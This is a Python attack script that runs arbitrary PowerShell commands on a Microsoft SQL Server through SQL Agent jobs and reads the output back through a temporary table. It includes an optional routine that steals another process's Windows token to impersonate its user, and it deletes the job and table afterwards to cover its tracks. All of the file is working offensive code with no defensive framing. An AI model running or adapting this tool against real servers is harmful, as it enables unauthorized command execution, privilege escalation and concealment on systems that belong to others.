#!/usr/bin/env python3
import pymssql
import time
import sys
import argparse
import random
import string

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def execute_command(server, username, password, database, command, pid=None):
    job_name = f"tmp_{random_string()}"
    table_name = f"tmp_{random_string()}"
    if ':' in server:
        port = server.split(':')[1]
    else:
        port = 1433
    
    try:
        # Connect
        conn = pymssql.connect(server=server, user=username, password=password, database=database, port=1433)
        cursor = conn.cursor()
        print(f"[+] Connected to {server}")
        
        # Create temp table
        print(f"[+] Creating table {table_name}")
        cursor.execute(f"""
            CREATE TABLE {table_name} (
                id INT IDENTITY(1,1) PRIMARY KEY,
                output NVARCHAR(MAX)
            )
        """)
        conn.commit()
        
        # PowerShell script that runs command and inserts to SQL
        if pid:
            # Wrap command in PowerShell script that outputs to file
            output_file = f"C:\\Windows\\Temp\\{random_string()}.txt"
            ps_command_wrapper = f"powershell.exe -NoProfile -Command ''{command} 2>&1 | Out-File -FilePath {output_file} -Encoding UTF8''"
            
            ps_script = f"""
$code = @''
using System;
using System.Runtime.InteropServices;
public class TokenSteal {{
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
}}
''@
Add-Type -TypeDefinition $code
$tmpFile = "C:\\Windows\\Temp\\{random_string()}.txt"
try {{
    $hProcess = [TokenSteal]::OpenProcess(0x0400, $false, {pid})
    $hToken = [IntPtr]::Zero
    [TokenSteal]::OpenProcessToken($hProcess, 0x0006, [ref]$hToken)
    $hDupToken = [IntPtr]::Zero
    [TokenSteal]::DuplicateTokenEx($hToken, 0x02000000, [IntPtr]::Zero, 2, 1, [ref]$hDupToken)
    [TokenSteal]::ImpersonateLoggedOnUser($hDupToken)
    {command} 2>&1 | Out-File -FilePath $tmpFile -Encoding UTF8
}} catch {{
    "Error: $_" | Out-File -FilePath $tmpFile -Encoding UTF8
}}
$output = Get-Content $tmpFile -Raw
Remove-Item $tmpFile -Force
$connString = "Server=localhost,{port};Database={database};Integrated Security=True;"
$conn = New-Object System.Data.SqlClient.SqlConnection($connString)
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "INSERT INTO {table_name} (output) VALUES (@output)"
$param = New-Object System.Data.SqlClient.SqlParameter("@output", [System.Data.SqlDbType]::NVarChar, -1)
$param.Value = $output
$cmd.Parameters.Add($param) | Out-Null
$cmd.ExecuteNonQuery() | Out-Null
$conn.Close()
"""
        else:
            ps_script = f"""
$output = & {{ {command} }} | Out-String
$connString = "Server=localhost,{port};Database={database};Integrated Security=True;"
$conn = New-Object System.Data.SqlClient.SqlConnection($connString)
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "INSERT INTO {table_name} (output) VALUES (@output)"
$param = New-Object System.Data.SqlClient.SqlParameter("@output", [System.Data.SqlDbType]::NVarChar, -1)
$param.Value = $output
$cmd.Parameters.Add($param) | Out-Null
$cmd.ExecuteNonQuery() | Out-Null
$conn.Close()
"""

        # Create job with PowerShell subsystem
        print(f"[+] Creating job {job_name}")
        cursor.execute(f"""
            EXEC msdb.dbo.sp_add_job @job_name = '{job_name}'
        """)
        
        # Use PowerShell subsystem instead of CMDEXEC
        cursor.execute(f"""
            EXEC msdb.dbo.sp_add_jobstep 
                @job_name = '{job_name}',
                @step_name = 'Execute',
                @subsystem = 'PowerShell',
                @command = '{ps_script}',
                @retry_attempts = 0,
                @retry_interval = 0
        """)
        
        cursor.execute(f"""
            EXEC msdb.dbo.sp_add_jobserver 
                @job_name = '{job_name}'
        """)
        conn.commit()
        
        # Execute job
        print(f"[+] Executing job")
        cursor.execute(f"EXEC msdb.dbo.sp_start_job @job_name = '{job_name}'")
        conn.commit()
        
        # Wait for completion
        print("[+] Waiting for job completion...")
        time.sleep(5)
        
        # Check job status
        max_wait = 30
        waited = 0
        while waited < max_wait:
            cursor.execute(f"""
                SELECT run_status 
                FROM msdb.dbo.sysjobhistory h
                JOIN msdb.dbo.sysjobs j ON h.job_id = j.job_id
                WHERE j.name = '{job_name}'
                ORDER BY h.run_date DESC, h.run_time DESC
            """)
            result = cursor.fetchone()
            if result:
                if result[0] == 1:  # Success
                    print("[+] Job completed successfully")
                    break
                elif result[0] in [0, 2, 3]:  # Failed/Retry/Cancelled
                    print(f"[!] Job failed with status: {result[0]}")
                    # Get error message
                    cursor.execute(f"""
                        SELECT message 
                        FROM msdb.dbo.sysjobhistory h
                        JOIN msdb.dbo.sysjobs j ON h.job_id = j.job_id
                        WHERE j.name = '{job_name}'
                        ORDER BY h.run_date DESC, h.run_time DESC
                    """)
                    error_msg = cursor.fetchone()
                    if error_msg:
                        print(f"[!] Error: {error_msg[0]}")
                    break
            time.sleep(2)
            waited += 2
        
        # Retrieve results
        print(f"[+] Retrieving results from {table_name}")
        cursor.execute(f"SELECT output FROM {table_name}")
        rows = cursor.fetchall()
        
        print("\n[+] Command Output:")
        print("=" * 60)
        if rows:
            for row in rows:
                if row[0]:
                    print(row[0])
        else:
            print("[!] No output returned")
        print("=" * 60)
        
        # Cleanup
        print(f"[+] Cleaning up...")
        cursor.execute(f"EXEC msdb.dbo.sp_delete_job @job_name = '{job_name}', @delete_unused_schedule = 1")
        cursor.execute(f"DROP TABLE {table_name}")
        conn.commit()
        
        # Verify cleanup
        print(f"[+] Verifying cleanup...")
        
        # Check if job still exists
        cursor.execute(f"""
            SELECT COUNT(*) FROM msdb.dbo.sysjobs WHERE name = '{job_name}'
        """)
        job_exists = cursor.fetchone()[0]
        
        # Check if table still exists
        cursor.execute(f"""
            SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES 
            WHERE TABLE_NAME = '{table_name}'
        """)
        table_exists = cursor.fetchone()[0]
        
        if job_exists == 0 and table_exists == 0:
            print("[+] Cleanup verified: Job and table successfully deleted")
        else:
            if job_exists > 0:
                print(f"[!] Warning: Job {job_name} still exists")
            if table_exists > 0:
                print(f"[!] Warning: Table {table_name} still exists")
        
        cursor.close()
        conn.close()
        print("[+] Done")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        # Attempt cleanup
        try:
            cursor.execute(f"EXEC msdb.dbo.sp_delete_job @job_name = '{job_name}', @delete_unused_schedule = 1")
            cursor.execute(f"IF OBJECT_ID('{table_name}', 'U') IS NOT NULL DROP TABLE {table_name}")
            conn.commit()
        except:
            pass
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Execute commands via MSSQL Jobs')
    parser.add_argument('-s', '--server', required=True, help='MSSQL Server')
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('-d', '--database', default='master', help='Database (default: master)')
    parser.add_argument('-c', '--command', required=True, help='PowerShell command to execute')
    parser.add_argument('--pid', type=int, help='PID to steal token from (optional)')
    
    args = parser.parse_args()
    
    execute_command(args.server, args.username, args.password, args.database, args.command, args.pid)
